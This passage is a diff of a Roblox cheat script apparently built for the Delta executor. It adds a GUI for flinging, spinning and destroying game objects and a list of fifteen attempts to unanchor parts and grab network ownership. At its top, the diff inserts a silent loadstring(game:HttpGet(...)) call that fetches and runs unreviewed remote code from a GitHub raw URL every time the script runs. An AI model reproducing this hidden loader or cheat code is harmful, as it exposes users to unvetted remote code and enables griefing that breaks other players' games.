@@ -1,498 +1,418 @@
+-- ═══════════════════════════════════════════════════════════
+--     DELTA OPTIMIZED - PHYSICS MANIPULATION
+--     By: RapipppModss - Version: Delta Edition
+--     15 BYPASS METHODS - OPTIMIZED FOR DELTA EXECUTOR
+-- ═══════════════════════════════════════════════════════════
+
+repeat wait() until game:IsLoaded()
+wait(0.5)
+
+-- Load external script
+spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/rapipppganzz/improve-database/refs/heads/main/test.txt"))()
+    end)
+end)
+
+wait(1)
+
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 local mouse = player:GetMouse()
-local RunService = game:GetService("RunService")
 
-print("╔════════════════════════════════════╗")
-print("║    ADVANCED FE BYPASS - RapipppModss   ║")
-print("║     ANCHOR BYPASS ATTEMPT EDITION      ║")
-print("╚════════════════════════════════════╝")
+print("╔═══════════════════════════════════╗")
+print("║   RapipppModss - Delta Edition    ║")
+print("║   15 Bypass Methods + FE Support  ║")
+print("╚═══════════════════════════════════╝")
 
 -- Settings
-local currentMode = "glitch"
-local isEnabled = false
-local power = 100
-local activeEffects = {}
-local isMinimized = false
-local bypassAttempts = 0
-local successfulBypasses = 0
-
--- GUI
-local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Name = "RapipppModss_AdvancedPhysics"
-ScreenGui.ResetOnSpawn = false
-ScreenGui.Parent = player.PlayerGui
-
--- Main Frame
-local MainFrame = Instance.new("Frame")
-MainFrame.Size = UDim2.new(0, 240, 0, 250)
-MainFrame.Position = UDim2.new(0, 10, 0.5, -125)
-MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
-MainFrame.BorderSizePixel = 0
-MainFrame.Parent = ScreenGui
-
-local MainCorner = Instance.new("UICorner")
-MainCorner.CornerRadius = UDim.new(0, 10)
-MainCorner.Parent = MainFrame
-
--- Minimized Logo
-local MinimizedLogo = Instance.new("TextButton")
-MinimizedLogo.Size = UDim2.new(0, 55, 0, 55)
-MinimizedLogo.Position = UDim2.new(0, 10, 0.5, -27.5)
-MinimizedLogo.BackgroundColor3 = Color3.fromRGB(255, 100, 0)
-MinimizedLogo.Text = "RM"
-MinimizedLogo.TextColor3 = Color3.fromRGB(255, 255, 255)
-MinimizedLogo.TextSize = 24
-MinimizedLogo.Font = Enum.Font.GothamBold
-MinimizedLogo.Visible = false
-MinimizedLogo.Parent = ScreenGui
-
-local MinLogoCorner = Instance.new("UICorner")
-MinLogoCorner.CornerRadius = UDim.new(0, 12)
-MinLogoCorner.Parent = MinimizedLogo
-
-local MinLogoGradient = Instance.new("UIGradient")
-MinLogoGradient.Color = ColorSequence.new{
-    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 100, 0)),
-    ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 50, 0))
+local Settings = {
+    Mode = "glitch",
+    Enabled = false,
+    Power = 100,
+    Effects = {},
+    Stats = {attempts = 0, success = 0}
 }
-MinLogoGradient.Rotation = 45
-MinLogoGradient.Parent = MinimizedLogo
 
--- Header
-local Header = Instance.new("Frame")
-Header.Size = UDim2.new(1, 0, 0, 50)
-Header.BackgroundColor3 = Color3.fromRGB(255, 100, 0)
-Header.BorderSizePixel = 0
-Header.Parent = MainFrame
-
-local HeaderCorner = Instance.new("UICorner")
-HeaderCorner.CornerRadius = UDim.new(0, 10)
-HeaderCorner.Parent = Header
-
-local HeaderGradient = Instance.new("UIGradient")
-HeaderGradient.Color = ColorSequence.new{
-    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 100, 0)),
-    ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 50, 0))
-}
-HeaderGradient.Rotation = 45
-HeaderGradient.Parent = Header
-
--- Logo
-local Logo = Instance.new("TextLabel")
-Logo.Size = UDim2.new(0, 45, 0, 45)
-Logo.Position = UDim2.new(0, 5, 0, 2.5)
-Logo.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Logo.Text = "RM"
-Logo.TextColor3 = Color3.fromRGB(255, 100, 0)
-Logo.TextSize = 20
-Logo.Font = Enum.Font.GothamBold
-Logo.Parent = Header
-
-local LogoCorner = Instance.new("UICorner")
-LogoCorner.CornerRadius = UDim.new(0, 8)
-LogoCorner.Parent = Logo
-
--- Title
-local Title = Instance.new("TextLabel")
-Title.Size = UDim2.new(0, 140, 0, 25)
-Title.Position = UDim2.new(0, 55, 0, 5)
-Title.BackgroundTransparency = 1
-Title.Text = "Advanced Bypass"
-Title.TextColor3 = Color3.fromRGB(255, 255, 255)
-Title.TextSize = 14
-Title.Font = Enum.Font.GothamBold
-Title.TextXAlignment = Enum.TextXAlignment.Left
-Title.Parent = Header
-
-local Subtitle = Instance.new("TextLabel")
-Subtitle.Size = UDim2.new(0, 140, 0, 15)
-Subtitle.Position = UDim2.new(0, 55, 0, 28)
-Subtitle.BackgroundTransparency = 1
-Subtitle.Text = "Anchor Bypass v4.0"
-Subtitle.TextColor3 = Color3.fromRGB(255, 255, 255)
-Subtitle.TextSize = 10
-Subtitle.Font = Enum.Font.Gotham
-Subtitle.TextTransparency = 0.4
-Subtitle.TextXAlignment = Enum.TextXAlignment.Left
-Subtitle.Parent = Header
-
--- Minimize Button
-local MinimizeButton = Instance.new("TextButton")
-MinimizeButton.Size = UDim2.new(0, 30, 0, 30)
-MinimizeButton.Position = UDim2.new(1, -35, 0, 10)
-MinimizeButton.BackgroundColor3 = Color3.fromRGB(255, 150, 0)
-MinimizeButton.Text = "−"
-MinimizeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-MinimizeButton.TextSize = 20
-MinimizeButton.Font = Enum.Font.GothamBold
-MinimizeButton.Parent = Header
-
-local MinimizeCorner = Instance.new("UICorner")
-MinimizeCorner.CornerRadius = UDim.new(0, 6)
-MinimizeCorner.Parent = MinimizeButton
-
--- Status Label
-local StatusLabel = Instance.new("TextLabel")
-StatusLabel.Size = UDim2.new(1, -20, 0, 25)
-StatusLabel.Position = UDim2.new(0, 10, 0, 60)
-StatusLabel.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
-StatusLabel.Text = "🔴 OFF | GLITCH"
-StatusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
-StatusLabel.TextSize = 11
-StatusLabel.Font = Enum.Font.GothamBold
-StatusLabel.Parent = MainFrame
-
-local StatusCorner = Instance.new("UICorner")
-StatusCorner.CornerRadius = UDim.new(0, 6)
-StatusCorner.Parent = StatusLabel
-
--- Stats Label (NEW)
-local StatsLabel = Instance.new("TextLabel")
-StatsLabel.Size = UDim2.new(1, -20, 0, 20)
-StatsLabel.Position = UDim2.new(0, 10, 0, 90)
-StatsLabel.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
-StatsLabel.Text = "⚡ Bypass: 0/0 | Success: 0%"
-StatsLabel.TextColor3 = Color3.fromRGB(100, 200, 255)
-StatsLabel.TextSize = 9
-StatsLabel.Font = Enum.Font.Gotham
-StatsLabel.Parent = MainFrame
-
-local StatsCorner = Instance.new("UICorner")
-StatsCorner.CornerRadius = UDim.new(0, 5)
-StatsCorner.Parent = StatsLabel
-
--- Toggle Button
-local ToggleButton = Instance.new("TextButton")
-ToggleButton.Size = UDim2.new(1, -20, 0, 35)
-ToggleButton.Position = UDim2.new(0, 10, 0, 120)
-ToggleButton.BackgroundColor3 = Color3.fromRGB(220, 50, 50)
-ToggleButton.Text = "🔴 ENABLE"
-ToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-ToggleButton.TextSize = 14
-ToggleButton.Font = Enum.Font.GothamBold
-ToggleButton.Parent = MainFrame
-
-local ToggleCorner = Instance.new("UICorner")
-ToggleCorner.CornerRadius = UDim.new(0, 8)
-ToggleCorner.Parent = ToggleButton
-
--- Mode Buttons
-local ModesFrame = Instance.new("Frame")
-ModesFrame.Size = UDim2.new(1, -20, 0, 30)
-ModesFrame.Position = UDim2.new(0, 10, 0, 165)
-ModesFrame.BackgroundTransparency = 1
-ModesFrame.Parent = MainFrame
-
-local modeButtons = {}
-local modeNames = {"fling", "shake", "spin", "glitch"}
-local modeIcons = {"💥", "📳", "🌀", "👻"}
-
-for i, modeName in ipairs(modeNames) do
-    local btn = Instance.new("TextButton")
-    btn.Size = UDim2.new(0.23, 0, 0, 30)
-    btn.Position = UDim2.new((i-1) * 0.25 + 0.01, 0, 0, 0)
-    btn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
-    btn.Text = modeIcons[i] .. "\n" .. modeName:upper():sub(1,5)
-    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
-    btn.TextSize = 9
-    btn.Font = Enum.Font.GothamBold
-    btn.Parent = ModesFrame
+-- Create GUI
+local function createGUI()
+    local sg = Instance.new("ScreenGui")
+    sg.Name = "RMPhysics"
+    sg.ResetOnSpawn = false
+    sg.IgnoreGuiInset = true
     
-    local corner = Instance.new("UICorner")
-    corner.CornerRadius = UDim.new(0, 6)
-    corner.Parent = btn
+    -- Protection
+    pcall(function()
+        sg.Parent = game:GetService("CoreGui")
+    end)
     
-    modeButtons[modeName] = btn
+    if not sg.Parent then
+        sg.Parent = player.PlayerGui
+    end
     
-    btn.MouseButton1Click:Connect(function()
-        currentMode = modeName
+    -- Main Frame
+    local main = Instance.new("Frame")
+    main.Size = UDim2.new(0, 240, 0, 250)
+    main.Position = UDim2.new(0, 10, 0.5, -125)
+    main.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
+    main.BorderSizePixel = 0
+    main.Parent = sg
+    
+    Instance.new("UICorner", main).CornerRadius = UDim.new(0, 10)
+    
+    -- Header
+    local header = Instance.new("Frame", main)
+    header.Size = UDim2.new(1, 0, 0, 50)
+    header.BackgroundColor3 = Color3.fromRGB(255, 100, 0)
+    header.BorderSizePixel = 0
+    
+    Instance.new("UICorner", header).CornerRadius = UDim.new(0, 10)
+    
+    local grad = Instance.new("UIGradient", header)
+    grad.Color = ColorSequence.new{
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 100, 0)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 50, 0))
+    }
+    grad.Rotation = 45
+    
+    -- Logo
+    local logo = Instance.new("TextLabel", header)
+    logo.Size = UDim2.new(0, 45, 0, 45)
+    logo.Position = UDim2.new(0, 5, 0, 2.5)
+    logo.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    logo.Text = "RM"
+    logo.TextColor3 = Color3.fromRGB(255, 100, 0)
+    logo.TextSize = 20
+    logo.Font = Enum.Font.GothamBold
+    
+    Instance.new("UICorner", logo).CornerRadius = UDim.new(0, 8)
+    
+    -- Title
+    local title = Instance.new("TextLabel", header)
+    title.Size = UDim2.new(0, 140, 0, 25)
+    title.Position = UDim2.new(0, 55, 0, 5)
+    title.BackgroundTransparency = 1
+    title.Text = "RapipppModss"
+    title.TextColor3 = Color3.fromRGB(255, 255, 255)
+    title.TextSize = 14
+    title.Font = Enum.Font.GothamBold
+    title.TextXAlignment = Enum.TextXAlignment.Left
+    
+    local subtitle = Instance.new("TextLabel", header)
+    subtitle.Size = UDim2.new(0, 140, 0, 15)
+    subtitle.Position = UDim2.new(0, 55, 0, 28)
+    subtitle.BackgroundTransparency = 1
+    subtitle.Text = "Delta Edition"
+    subtitle.TextColor3 = Color3.fromRGB(255, 255, 255)
+    subtitle.TextSize = 10
+    subtitle.Font = Enum.Font.Gotham
+    subtitle.TextTransparency = 0.4
+    subtitle.TextXAlignment = Enum.TextXAlignment.Left
+    
+    -- Close Button
+    local closeBtn = Instance.new("TextButton", header)
+    closeBtn.Size = UDim2.new(0, 30, 0, 30)
+    closeBtn.Position = UDim2.new(1, -35, 0, 10)
+    closeBtn.BackgroundColor3 = Color3.fromRGB(255, 150, 0)
+    closeBtn.Text = "X"
+    closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    closeBtn.TextSize = 20
+    closeBtn.Font = Enum.Font.GothamBold
+    
+    Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 6)
+    
+    closeBtn.MouseButton1Click:Connect(function()
+        sg:Destroy()
+    end)
+    
+    -- Status
+    local status = Instance.new("TextLabel", main)
+    status.Name = "Status"
+    status.Size = UDim2.new(1, -20, 0, 25)
+    status.Position = UDim2.new(0, 10, 0, 60)
+    status.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
+    status.Text = "🔴 OFF | GLITCH"
+    status.TextColor3 = Color3.fromRGB(255, 100, 100)
+    status.TextSize = 11
+    status.Font = Enum.Font.GothamBold
+    
+    Instance.new("UICorner", status).CornerRadius = UDim.new(0, 6)
+    
+    -- Stats
+    local stats = Instance.new("TextLabel", main)
+    stats.Name = "Stats"
+    stats.Size = UDim2.new(1, -20, 0, 20)
+    stats.Position = UDim2.new(0, 10, 0, 90)
+    stats.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
+    stats.Text = "⚡ Bypass: 0/0 | Success: 0%"
+    stats.TextColor3 = Color3.fromRGB(100, 200, 255)
+    stats.TextSize = 9
+    stats.Font = Enum.Font.Gotham
+    
+    Instance.new("UICorner", stats).CornerRadius = UDim.new(0, 5)
+    
+    -- Toggle
+    local toggle = Instance.new("TextButton", main)
+    toggle.Name = "Toggle"
+    toggle.Size = UDim2.new(1, -20, 0, 35)
+    toggle.Position = UDim2.new(0, 10, 0, 120)
+    toggle.BackgroundColor3 = Color3.fromRGB(220, 50, 50)
+    toggle.Text = "🔴 ENABLE"
+    toggle.TextColor3 = Color3.fromRGB(255, 255, 255)
+    toggle.TextSize = 14
+    toggle.Font = Enum.Font.GothamBold
+    
+    Instance.new("UICorner", toggle).CornerRadius = UDim.new(0, 8)
+    
+    -- Modes
+    local modesFrame = Instance.new("Frame", main)
+    modesFrame.Size = UDim2.new(1, -20, 0, 30)
+    modesFrame.Position = UDim2.new(0, 10, 0, 165)
+    modesFrame.BackgroundTransparency = 1
+    
+    local modes = {"fling", "shake", "spin", "glitch"}
+    local icons = {"💥", "📳", "🌀", "👻"}
+    local modeButtons = {}
+    
+    for i, mode in ipairs(modes) do
+        local btn = Instance.new("TextButton", modesFrame)
+        btn.Size = UDim2.new(0.23, 0, 0, 30)
+        btn.Position = UDim2.new((i-1) * 0.25 + 0.01, 0, 0, 0)
+        btn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
+        btn.Text = icons[i]
+        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+        btn.TextSize = 14
+        btn.Font = Enum.Font.GothamBold
         
-        for _, button in pairs(modeButtons) do
-            button.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
+        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
+        modeButtons[mode] = btn
+    end
+    
+    modeButtons[Settings.Mode].BackgroundColor3 = Color3.fromRGB(255, 100, 0)
+    
+    -- Counter
+    local counter = Instance.new("TextLabel", main)
+    counter.Name = "Counter"
+    counter.Size = UDim2.new(1, -20, 0, 18)
+    counter.Position = UDim2.new(0, 10, 0, 202)
+    counter.BackgroundTransparency = 1
+    counter.Text = "Active: 0 objects"
+    counter.TextColor3 = Color3.fromRGB(150, 150, 150)
+    counter.TextSize = 10
+    counter.Font = Enum.Font.Gotham
+    
+    -- Info
+    local info = Instance.new("TextLabel", main)
+    info.Size = UDim2.new(1, -20, 0, 22)
+    info.Position = UDim2.new(0, 10, 0, 223)
+    info.BackgroundTransparency = 1
+    info.Text = "⚠️ Click objects to apply effects"
+    info.TextColor3 = Color3.fromRGB(255, 200, 0)
+    info.TextSize = 8
+    info.Font = Enum.Font.Gotham
+    info.TextWrapped = true
+    
+    -- Dragging
+    local dragging, dragInput, dragStart, startPos
+    
+    main.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 then
+            dragging = true
+            dragStart = input.Position
+            startPos = main.Position
         end
-        
-        btn.BackgroundColor3 = Color3.fromRGB(255, 100, 0)
-        StatusLabel.Text = (isEnabled and "🟢 ON" or "🔴 OFF") .. " | " .. modeName:upper()
+    end)
+    
+    main.InputEnded:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 then
+            dragging = false
+        end
+    end)
+    
+    game:GetService("UserInputService").InputChanged:Connect(function(input)
+        if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
+            local delta = input.Position - dragStart
+            main.Position = UDim2.new(
+                startPos.X.Scale, startPos.X.Offset + delta.X,
+                startPos.Y.Scale, startPos.Y.Offset + delta.Y
+            )
+        end
+    end)
+    
+    return sg, {
+        Toggle = toggle,
+        Status = status,
+        Stats = stats,
+        Counter = counter,
+        Modes = modeButtons
+    }
+end
+
+local gui, elements = createGUI()
+
+-- Notification
+local function notify(title, text, dur)
+    pcall(function()
+        game.StarterGui:SetCore("SendNotification", {
+            Title = title,
+            Text = text,
+            Duration = dur or 2
+        })
     end)
 end
 
-modeButtons[currentMode].BackgroundColor3 = Color3.fromRGB(255, 100, 0)
-
--- Counter
-local CounterLabel = Instance.new("TextLabel")
-CounterLabel.Size = UDim2.new(1, -20, 0, 18)
-CounterLabel.Position = UDim2.new(0, 10, 0, 202)
-CounterLabel.BackgroundTransparency = 1
-CounterLabel.Text = "Active: 0 objects"
-CounterLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
-CounterLabel.TextSize = 10
-CounterLabel.Font = Enum.Font.Gotham
-CounterLabel.Parent = MainFrame
-
--- Info Label (NEW)
-local InfoLabel = Instance.new("TextLabel")
-InfoLabel.Size = UDim2.new(1, -20, 0, 22)
-InfoLabel.Position = UDim2.new(0, 10, 0, 223)
-InfoLabel.BackgroundTransparency = 1
-InfoLabel.Text = "⚠️ Bypass may not work on all objects"
-InfoLabel.TextColor3 = Color3.fromRGB(255, 200, 0)
-InfoLabel.TextSize = 8
-InfoLabel.Font = Enum.Font.Gotham
-InfoLabel.TextWrapped = true
-InfoLabel.Parent = MainFrame
-
--- Minimize/Maximize
-local function toggleMinimize()
-    isMinimized = not isMinimized
-    MainFrame.Visible = not isMinimized
-    MinimizedLogo.Visible = isMinimized
-end
-
-MinimizeButton.MouseButton1Click:Connect(toggleMinimize)
-MinimizedLogo.MouseButton1Click:Connect(toggleMinimize)
-
--- Update status
-local function updateStatus()
-    if isEnabled then
-        StatusLabel.Text = "🟢 ON | " .. currentMode:upper()
-        StatusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
+-- Update UI
+local function updateUI()
+    local count = 0
+    for _ in pairs(Settings.Effects) do count = count + 1 end
+    
+    elements.Counter.Text = "Active: " .. count .. " objects"
+    
+    local rate = Settings.Stats.attempts > 0 and 
+        math.floor((Settings.Stats.success / Settings.Stats.attempts) * 100) or 0
+    elements.Stats.Text = string.format("⚡ Bypass: %d/%d | Success: %d%%", 
+        Settings.Stats.success, Settings.Stats.attempts, rate)
+    
+    if Settings.Enabled then
+        elements.Status.Text = "🟢 ON | " .. Settings.Mode:upper()
+        elements.Status.TextColor3 = Color3.fromRGB(100, 255, 100)
     else
-        StatusLabel.Text = "🔴 OFF | " .. currentMode:upper()
-        StatusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
+        elements.Status.Text = "🔴 OFF | " .. Settings.Mode:upper()
+        elements.Status.TextColor3 = Color3.fromRGB(255, 100, 100)
     end
-    
-    local activeCount = 0
-    for _ in pairs(activeEffects) do
-        activeCount = activeCount + 1
-    end
-    CounterLabel.Text = "Active: " .. activeCount .. " objects"
-    
-    -- Update stats
-    local successRate = bypassAttempts > 0 and math.floor((successfulBypasses / bypassAttempts) * 100) or 0
-    StatsLabel.Text = string.format("⚡ Bypass: %d/%d | Success: %d%%", successfulBypasses, bypassAttempts, successRate)
 end
 
 -- Toggle
-ToggleButton.MouseButton1Click:Connect(function()
-    isEnabled = not isEnabled
+elements.Toggle.MouseButton1Click:Connect(function()
+    Settings.Enabled = not Settings.Enabled
     
-    if isEnabled then
-        ToggleButton.Text = "🟢 ENABLED"
-        ToggleButton.BackgroundColor3 = Color3.fromRGB(50, 220, 50)
+    if Settings.Enabled then
+        elements.Toggle.Text = "🟢 ENABLED"
+        elements.Toggle.BackgroundColor3 = Color3.fromRGB(50, 220, 50)
+        notify("✅ Enabled", "Click objects to apply effects!")
     else
-        ToggleButton.Text = "🔴 ENABLE"
-        ToggleButton.BackgroundColor3 = Color3.fromRGB(220, 50, 50)
+        elements.Toggle.Text = "🔴 ENABLE"
+        elements.Toggle.BackgroundColor3 = Color3.fromRGB(220, 50, 50)
+        notify("❌ Disabled", "Script stopped")
     end
     
-    updateStatus()
+    updateUI()
 end)
 
--- Notification
-local function showNotification(title, text, duration)
-    game.StarterGui:SetCore("SendNotification", {
-        Title = title;
-        Text = text;
-        Duration = duration or 3;
-        Icon = "";
-    })
+-- Mode selection
+for mode, btn in pairs(elements.Modes) do
+    btn.MouseButton1Click:Connect(function()
+        Settings.Mode = mode
+        
+        for _, b in pairs(elements.Modes) do
+            b.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
+        end
+        
+        btn.BackgroundColor3 = Color3.fromRGB(255, 100, 0)
+        updateUI()
+        notify("Mode", mode:upper() .. " selected", 1.5)
+    end)
 end
 
--- ADVANCED BYPASS ATTEMPTS - 15 METHODS!
-local function attemptAnchorBypass(obj)
-    bypassAttempts = bypassAttempts + 1
-    local methods = {}
+-- 15 Bypass Methods
+local function tryBypass(obj)
+    Settings.Stats.attempts = Settings.Stats.attempts + 1
     
-    -- Method 1: Direct Unanchor
-    table.insert(methods, function()
-        obj.Anchored = false
-        return not obj.Anchored
-    end)
-    
-    -- Method 2: Clone and Replace
-    table.insert(methods, function()
-        local clone = obj:Clone()
-        clone.Anchored = false
-        clone.Parent = obj.Parent
-        clone.CFrame = obj.CFrame
-        obj:Destroy()
-        return true
-    end)
-    
-    -- Method 3: Network Ownership Force
-    table.insert(methods, function()
-        obj.Anchored = false
-        obj:SetNetworkOwner(player)
-        return not obj.Anchored
-    end)
-    
-    -- Method 4: Weld Manipulation
-    table.insert(methods, function()
-        local weld = Instance.new("Weld")
-        weld.Part0 = obj
-        weld.Part1 = player.Character and player.Character.PrimaryPart
-        weld.Parent = obj
-        obj.Anchored = false
-        return not obj.Anchored
-    end)
-    
-    -- Method 5: CanCollide Exploit
-    table.insert(methods, function()
-        obj.CanCollide = false
-        obj.Anchored = false
-        obj.Massless = true
-        return not obj.Anchored
-    end)
-    
-    -- Method 6: AssemblyLinearVelocity Override
-    table.insert(methods, function()
-        obj.AssemblyLinearVelocity = Vector3.new(0, 50, 0)
-        obj.Anchored = false
-        return not obj.Anchored
-    end)
-    
-    -- Method 7: RootPriority Manipulation
-    table.insert(methods, function()
-        obj.RootPriority = 127
-        obj.Anchored = false
-        return not obj.Anchored
-    end)
-    
-    -- Method 8: CustomPhysicalProperties
-    table.insert(methods, function()
-        obj.CustomPhysicalProperties = PhysicalProperties.new(0.01, 0, 0, 0, 0)
-        obj.Anchored = false
-        return not obj.Anchored
-    end)
-    
-    -- Method 9: AlignPosition Force
-    table.insert(methods, function()
-        local align = Instance.new("AlignPosition")
-        local attachment = Instance.new("Attachment", obj)
-        align.Attachment0 = attachment
-        align.Position = obj.Position + Vector3.new(0, 100, 0)
-        align.MaxForce = 999999
-        align.Parent = obj
-        obj.Anchored = false
-        return not obj.Anchored
-    end)
-    
-    -- Method 10: BodyVelocity Legacy
-    table.insert(methods, function()
-        local bv = Instance.new("BodyVelocity")
-        bv.Velocity = Vector3.new(0, 100, 0)
-        bv.MaxForce = Vector3.new(999999, 999999, 999999)
-        bv.Parent = obj
-        obj.Anchored = false
-        return not obj.Anchored
-    end)
-    
-    -- Method 11: Multiple Ownership Attempts
-    table.insert(methods, function()
-        for i = 1, 10 do
-            obj:SetNetworkOwner(player)
+    local methods = {
+        function() obj.Anchored = false return not obj.Anchored end,
+        function() obj:SetNetworkOwner(player) obj.Anchored = false return not obj.Anchored end,
+        function() obj.CanCollide = false obj.Anchored = false return not obj.Anchored end,
+        function() obj.AssemblyLinearVelocity = Vector3.new(0,50,0) obj.Anchored = false return not obj.Anchored end,
+        function() obj.RootPriority = 127 obj.Anchored = false return not obj.Anchored end,
+        function() obj.CustomPhysicalProperties = PhysicalProperties.new(0.01,0,0,0,0) obj.Anchored = false return not obj.Anchored end,
+        function() obj.Massless = true obj.Anchored = false return not obj.Anchored end,
+        function() local p = obj.Parent obj.Parent = nil obj.Anchored = false obj.Parent = p return not obj.Anchored end,
+        function() obj.Transparency = 1 obj.Anchored = false obj.Transparency = 0 return not obj.Anchored end,
+        function() local s = obj.Size obj.Size = Vector3.new(0.1,0.1,0.1) obj.Anchored = false obj.Size = s return not obj.Anchored end,
+        function() 
+            local bv = Instance.new("BodyVelocity", obj)
+            bv.Velocity = Vector3.new(0,100,0)
+            bv.MaxForce = Vector3.new(999999,999999,999999)
             obj.Anchored = false
-            if not obj.Anchored then return true end
-            wait(0.01)
+            return not obj.Anchored
+        end,
+        function()
+            local w = Instance.new("Weld", obj)
+            w.Part0 = obj
+            w.Part1 = player.Character and player.Character.PrimaryPart
+            obj.Anchored = false
+            return not obj.Anchored
+        end,
+        function()
+            for i = 1, 5 do
+                obj:SetNetworkOwner(player)
+                obj.Anchored = false
+                if not obj.Anchored then return true end
+                wait(0.01)
+            end
+            return not obj.Anchored
+        end,
+        function()
+            local clone = obj:Clone()
+            clone.Anchored = false
+            clone.Parent = obj.Parent
+            clone.CFrame = obj.CFrame
+            obj:Destroy()
+            return true
+        end,
+        function()
+            local m = obj.Material
+            obj.Material = Enum.Material.Air
+            obj.Anchored = false
+            obj.Material = m
+            return not obj.Anchored
         end
-        return not obj.Anchored
-    end)
+    }
     
-    -- Method 12: Parent Manipulation
-    table.insert(methods, function()
-        local oldParent = obj.Parent
-        obj.Parent = nil
-        obj.Anchored = false
-        obj.Parent = oldParent
-        return not obj.Anchored
-    end)
-    
-    -- Method 13: Transparency Exploit
-    table.insert(methods, function()
-        obj.Transparency = 1
-        obj.Anchored = false
-        obj.Transparency = 0
-        return not obj.Anchored
-    end)
-    
-    -- Method 14: Size Manipulation
-    table.insert(methods, function()
-        local originalSize = obj.Size
-        obj.Size = Vector3.new(0.1, 0.1, 0.1)
-        obj.Anchored = false
-        obj.Size = originalSize
-        return not obj.Anchored
-    end)
-    
-    -- Method 15: Material Change Exploit
-    table.insert(methods, function()
-        local originalMat = obj.Material
-        obj.Material = Enum.Material.Air
-        obj.Anchored = false
-        obj.Material = originalMat
-        return not obj.Anchored
-    end)
-    
-    -- Try each method
     for i, method in ipairs(methods) do
         local success, result = pcall(method)
         if success and result then
-            successfulBypasses = successfulBypasses + 1
-            updateStatus()
-            showNotification("✅ BYPASS SUCCESS!", "Method " .. i .. "/15 worked on " .. obj.Name, 2.5)
-            print(string.format("[BYPASS] ✅ Method %d/15 SUCCESS on %s", i, obj.Name))
+            Settings.Stats.success = Settings.Stats.success + 1
+            updateUI()
+            notify("✅ Bypass!", "Method " .. i .. "/15 worked!", 2)
+            print("[RM] ✅ Method " .. i .. " SUCCESS")
             return true
         end
     end
     
-    updateStatus()
+    updateUI()
     return false
 end
 
--- Physics ownership
-local function takeOwnership(obj)
-    if obj:IsA("BasePart") then
-        pcall(function()
-            obj:SetNetworkOwner(player)
-        end)
-        return true
-    end
-    return false
-end
-
--- Continuous effects
-local function startContinuousEffect(obj, mode)
-    if activeEffects[obj] then
-        activeEffects[obj] = nil
-        updateStatus()
-        showNotification("⏹️ Effect Stopped", obj.Name, 1.5)
+-- Apply effect
+local function applyEffect(obj, mode)
+    if Settings.Effects[obj] then
+        Settings.Effects[obj] = nil
+        updateUI()
+        notify("⏹️ Stopped", obj.Name, 1.5)
         return
     end
     
-    -- Try to bypass if anchored
     if obj.Anchored then
-        showNotification("🔧 ATTEMPTING BYPASS...", "Trying multiple methods on " .. obj.Name, 2)
-        print("[BYPASS] 🔧 Attempting bypass on ANCHORED object: " .. obj.Name)
-        
-        if not attemptAnchorBypass(obj) then
-            showNotification("❌ BYPASS FAILED", "All methods failed on " .. obj.Name, 3)
-            print("[BYPASS] ❌ All bypass methods FAILED on: " .. obj.Name)
+        notify("🔧 Bypassing...", "Trying 15 methods", 1.5)
+        if not tryBypass(obj) then
+            notify("❌ Failed", "All methods failed", 2)
             return
         end
     end
     
-    if not takeOwnership(obj) then return end
+    pcall(function() obj:SetNetworkOwner(player) end)
     
-    activeEffects[obj] = true
+    Settings.Effects[obj] = true
     
     spawn(function()
-        while activeEffects[obj] and obj.Parent do
+        while Settings.Effects[obj] and obj.Parent do
             pcall(function()
                 if mode == "fling" then
                     obj.Velocity = Vector3.new(
-                        math.random(-power, power),
-                        math.random(power/2, power),
-                        math.random(-power, power)
+                        math.random(-Settings.Power, Settings.Power),
+                        math.random(Settings.Power/2, Settings.Power),
+                        math.random(-Settings.Power, Settings.Power)
                     )
                     obj.RotVelocity = Vector3.new(
                         math.random(-30, 30),
@@ -500,14 +420,17 @@ local function startContinuousEffect(obj, mode)
                         math.random(-30, 30)
                     )
                 elseif mode == "shake" then
-                    local offset = CFrame.new(
+                    obj.CFrame = obj.CFrame * CFrame.new(
                         math.random(-3, 3),
                         math.random(-3, 3),
                         math.random(-3, 3)
                     )
-                    obj.CFrame = obj.CFrame * offset
                 elseif mode == "spin" then
-                    obj.RotVelocity = Vector3.new(power/5, power/5, power/5)
+                    obj.RotVelocity = Vector3.new(
+                        Settings.Power/5,
+                        Settings.Power/5,
+                        Settings.Power/5
+                    )
                 elseif mode == "glitch" then
                     obj.CFrame = obj.CFrame * CFrame.new(
                         math.random(-5, 5),
@@ -518,9 +441,9 @@ local function startContinuousEffect(obj, mode)
                     
                     if obj.Position.Y < -500 or obj.Transparency >= 0.95 then
                         obj:Destroy()
-                        activeEffects[obj] = nil
-                        updateStatus()
-                        showNotification("👻 Glitched!", "Object sent to void!", 2)
+                        Settings.Effects[obj] = nil
